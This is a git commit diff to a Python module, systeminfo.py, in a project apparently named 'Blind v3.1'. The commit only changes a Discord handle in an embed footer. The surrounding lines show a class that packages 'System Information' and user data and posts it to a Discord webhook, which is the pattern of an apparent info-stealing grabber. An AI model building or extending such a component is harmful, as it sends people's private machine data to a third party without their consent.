aaa79f6ce7512a410619cd8a9276640adf8613dc
READDONE313 <98390001+READDONE313@users.noreply.github.com>
2023-05-10 14:03:59 +0000

    Update systeminfo.py

--- src/components/systeminfo.py
+++ src/components/systeminfo.py
@@ -16,7 +16,7 @@ class SystemInfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
         embed = Embed(title="System Information", color=0x24262A)
-        embed.set_footer(text="Blind v3.1 · Created by: readdone#9772")
+        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
 
         embed.add_field(
             name=self.user_data()[0],
